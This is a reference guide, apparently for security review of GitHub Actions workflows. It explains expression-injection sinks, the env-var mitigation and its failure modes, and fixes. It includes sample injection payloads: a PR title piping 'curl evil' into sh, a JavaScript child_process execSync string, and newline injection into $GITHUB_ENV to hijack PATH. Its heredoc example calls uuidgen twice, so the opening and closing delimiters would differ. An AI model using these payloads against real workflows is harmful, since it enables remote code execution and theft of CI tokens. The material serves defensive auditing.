<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# Expression injection sinks and safe interpolation

## When to use

Load this when any step in the workflow uses `${{ }}` interpolation inside `run:`, composite action `run:`, `actions/github-script` or `actions/script` bodies, or writes data to `$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`, or `$GITHUB_STEP_SUMMARY`. Use it to classify sinks, distinguish real injection from the env-var mitigation, and write fixes.

## Contents

- Controllability of common context fields
- Sink catalogue (shell, JS, workflow-command files)
- The `env:` + quoted-shell mitigation (and how it breaks)
- Workflow-command-file injection (`$GITHUB_ENV` and friends)
- Indirect sinks: outputs, matrix, composite/reusable plumbing
- False-positive traps
- Concrete fixes

## Controllability of context fields

Classify every `${{ ... }}` before judging the sink.

| Field | Class | Notes |
|---|---|---|
| `github.event.pull_request.title` / `body` | attacker | free-form text from PR author |
| `github.event.pull_request.head.ref` | attacker | branch name; commonly contains `;`, backticks, `$()` |
| `github.event.pull_request.head.label` / `head.repo.*` | attacker | fork-controlled |
| `github.head_ref` | attacker | same as head ref on `pull_request*` |
| `github.event.issue.title` / `body` | attacker | anyone who can open issues |
| `github.event.comment.body` | attacker | anyone who can comment (unless gated) |
| `github.event.review.body`, `review_comment.body` | attacker | reviewer-controlled |
| `github.event.discussion.*`, `discussion_comment.*` | attacker | public on most repos |
| `github.event.label.name`, `assignee.login` | attacker-influenced | label name is repo-controlled but workflow author may not be the same trust as PR author |
| `github.event.pusher.name`, `head_commit.message`, `head_commit.author.*` | attacker | commit metadata is fully controlled by pusher |
| `github.actor` | mostly trusted, but spoofable on `pull_request_target` (it can be the PR author) — verify event |
| `github.event.workflow_run.head_branch`, `head_commit.message` | attacker | upstream PR data |
| `inputs.*` on `workflow_dispatch` | maintainer-controlled by default; reclassify if reachable from a public trigger |
| `inputs.*` on `workflow_call` | caller-controlled; class depends on the caller |
| `github.repository`, `github.run_id`, `github.sha` | trusted |
| `github.ref` on `push` to default branch | trusted |
| `github.ref` on `pull_request_target` | trusted (refs/pull/N/merge), but do not confuse with `head.ref` |

A finding requires the field to be attacker- or untrusted-caller-controlled AND to reach a code-execution sink.

## Sink catalogue

### 1. Shell (`run:`)

Inline `${{ }}` is substituted into the script text BEFORE the shell sees it. The value becomes shell syntax, not data.

Bad:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

A PR title of `"; curl evil | sh; #` becomes:

```bash
echo "Title: "; curl evil | sh; #"
```

This is RCE in the job's privilege context. Same for backticks and `$(...)`.

This sink applies to every `run:`, including:

- `jobs.<id>.steps[*].run`
- composite action `runs.steps[*].run` (a `run:` inside `action.yml`)
- `run:` inside reusable workflows

### 2. `actions/github-script`, `actions/script`, similar JS/Python script inputs

The `script:` body is evaluated as JavaScript. Interpolation embeds the value as JS source.

Bad:

```yaml
- uses: actions/github-script@<sha>
  with:
    script: |
      const title = "${{ github.event.pull_request.title }}";
      core.info(title);
```

A title containing `";process.mainModule.require('child_process').execSync('id');//` runs arbitrary code with the job's `GITHUB_TOKEN`.

Same hazard for any action whose input is later `eval`'d, `Function`'d, or rendered into a template (some custom actions accept `template:` or `script:` strings).

### 3. Workflow-command files

These are files whose contents the runner parses to mutate environment, PATH, outputs, or summaries:

- `$GITHUB_ENV` — sets job-scoped env vars for later steps
- `$GITHUB_OUTPUT` — sets step outputs consumed by `${{ steps.x.outputs.y }}`
- `$GITHUB_PATH` — prepends to `PATH`
- `$GITHUB_STEP_SUMMARY` — markdown summary; lower impact but can host phishing/links

A newline in the value lets the attacker introduce a new command. See dedicated section below.

### 4. Action inputs that funnel into shell

Some popular actions execute their `with:` inputs as shell internally (e.g. anything that runs `bash -c "$INPUT"`). If an attacker-controlled expression is interpolated into such an input, treat it as a `run:` sink. Resolve the action to confirm.

### 5. `if:` conditionals

`if: ${{ github.event.pull_request.title == 'release' }}` evaluates as a workflow expression, not shell. It is generally safe from RCE, but attacker control of the condition can still cause logic bypass (e.g., gating on a comment body that the attacker authored). Report as authorization issue when relevant, not as expression-injection RCE.

## The `env:` + quoted-shell mitigation

The standard fix is to bind the value to an environment variable and read it in shell, with quoting.

Safe:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Title: $PR_TITLE"
```

Why it works: the `env:` map is set by the runner before the shell starts; the shell sees a normal env var and `"$PR_TITLE"` is a single argument. No expression substitution happens inside the script body.

Do NOT report this pattern as expression injection. But verify before clearing it:

- The variable must be quoted: `"$PR_TITLE"`, not `$PR_TITLE`. Unquoted use re-enables word-splitting and glob expansion (still not RCE in most shells, but a real bug if the value flows into a command argument list — e.g., `git checkout $PR_TITLE`).
- It must not flow into `eval`, `bash -c "$PR_TITLE"`, `sh -c`, `ssh host "$PR_TITLE"`, or backticks. These re-parse the value as shell.
- It must not be passed to `actions/github-script` script body, JS templating, or any sink that re-evaluates the string as code.
- PowerShell on Windows runners has different quoting; `"$env:PR_TITLE"` inside `pwsh` is safe, but interpolation into double-quoted strings followed by `Invoke-Expression` is not.

Bad (mitigation broken):

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    eval "echo $PR_TITLE"        # eval re-parses
    bash -c "echo $PR_TITLE"     # subshell re-parses
    git log --grep=$PR_TITLE     # unquoted; word-split into args
```

Bad (env-var into JS sink):

```yaml
- uses: actions/github-script@<sha>
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  with:
    script: |
      const t = "${{ env.PR_TITLE }}"   # still interpolated as JS source!
```

The fix in github-script is to read from `process.env` inside the script:

```yaml
- uses: actions/github-script@<sha>
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  with:
    script: |
      const t = process.env.PR_TITLE;
      core.info(t);
```

## Workflow-command-file injection

Writing attacker data to `$GITHUB_ENV`, `$GITHUB_OUTPUT`, or `$GITHUB_PATH` without sanitization is exploitable when the value can contain newlines. The runner parses each line.

Bad (`$GITHUB_ENV`):

```yaml
- run: echo "DESC=${{ github.event.pull_request.body }}" >> "$GITHUB_ENV"
```

A body of:

```
benign
PATH=/tmp/evil:/usr/bin
SECRET_TOKEN=stolen
```

ends up exporting `PATH` and any other env var the attacker chooses for every later step. If a later step runs `npm` or `git`, the attacker's `/tmp/evil/git` runs first.

Bad (`$GITHUB_PATH`):

```yaml
- run: echo "${{ inputs.tool_dir }}" >> "$GITHUB_PATH"
```

Newline in `tool_dir` prepends multiple directories; a malicious one shadows real binaries.

Bad (`$GITHUB_OUTPUT`):

```yaml
- id: meta
  run: echo "branch=${{ github.head_ref }}" >> "$GITHUB_OUTPUT"
- run: git checkout "${{ steps.meta.outputs.branch }}"
```

Newline in head ref injects additional outputs; quoting in the second step does not save you because `${{ }}` is substituted at render time.

### Heredoc / random-delimiter pattern

The runner supports a multiline form that is safe IF the delimiter is unguessable and not present in the value. Even so, validate or strip newlines for `$GITHUB_PATH`.

Safer for env:

```yaml
- env:
    BODY: ${{ github.event.pull_request.body }}
  run: |
    {
      echo "DESC<<__EOF_$(uuidgen)__"
      printf '%s\n' "$BODY"
      echo "__EOF_$(uuidgen)__"
    } >> "$GITHUB_ENV"
```

But the safer answer is usually: do not promote attacker data into env at all. Keep it in a file or a single-step local variable.

For `$GITHUB_PATH`, never write attacker-influenced strings; restrict to literals controlled by the workflow author.

For `$GITHUB_STEP_SUMMARY`, treat it as untrusted markdown. It is rendered with images and links; an attacker can phish maintainers or leak via image src. Strip control chars and avoid rendering unsanitized HTML.

## Indirect sinks

Sinks often appear one or two hops away. Trace forward:

- A step writes attacker data to an output → a later step interpolates `${{ steps.x.outputs.y }}` into shell → expression injection in the later step.
- A step sets `$GITHUB_ENV` from attacker data → a later step uses `$VAR` unquoted, or a later `${{ env.VAR }}` interpolates into a sink.
- A composite action accepts `inputs.x` and uses `${{ inputs.x }}` inside its own `run:` → caller passes attacker data → injection in the action.
- A reusable workflow takes `inputs.x` and pipes into shell → upstream caller forwards `${{ github.event.pull_request.title }}` → injection.
- Matrix expansion: `matrix:` values are interpolated into the rendered job; if a matrix list is built from attacker data via `fromJSON` of a previous output, it becomes a sink.

When evaluating a sink, follow `outputs:` and reusable/composite `inputs:` declarations to their consumers.

## False-positive traps

Do NOT report these as expression injection:

- `env:`-bound value used as `"$VAR"` in `bash`/`sh`, with no `eval`/`-c`/backticks/JS sink downstream. This is the recommended mitigation.
- `if:` expressions comparing attacker data with `==` or `contains()` — this is a logic check, not code execution. (May still be an authorization bug; report under that lens.)
- Interpolation of trusted fields: `${{ github.repository }}`, `${{ github.sha }}`, `${{ github.run_id }}`, `${{ github.run_number }}`, integer/boolean fields. They are not attacker-shaped.
- `${{ secrets.X }}` in `run:` — this is secret exposure risk on logs/traces, not injection (secrets are masked but can be coerced out; report under secrets, not expression injection).
- `workflow_dispatch` `choice` or `boolean` inputs whose values are hardcoded shell-safe strings. Constrained domain; not a sink unless concatenated with attacker data.
- `${{ inputs.x }}` on a reusable workflow whose only callers are internal and pass trusted data — verify by enumerating callers; do not assume.

Watch for these subtler cases that ARE real:

- `env:` value used inside a here-doc that is then piped to `bash`: `cat <<EOF | bash\n$VAR\nEOF` — the body is re-parsed.
- `env:` value used in `make` arguments: `make TARGET=$VAR` where the Makefile evaluates `$(shell ...)` on `TARGET`.
- Quoted use that flows into `git`'s `--upload-pack` / `-c` / `core.sshCommand`: git accepts arguments that execute commands.
- Attacker data interpolated into `printf` format string (not arguments): `printf "$VAR"` — format-string bug, can crash or leak; report as injection.
- Attacker data in YAML strings that are later parsed and `eval`'d by a script: `python -c "$SCRIPT"` where `$SCRIPT` came from env. The env var is re-parsed as Python source.

## Concrete fixes

For shell sinks:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    set -eu
    printf 'title=%s\n' "$PR_TITLE"
    git fetch origin "refs/heads/$HEAD_REF":refs/remotes/origin/pr   # quoted, no eval
```

For `actions/github-script`:

```yaml
- uses: actions/github-script@<commit-sha>
  env:
    PR_
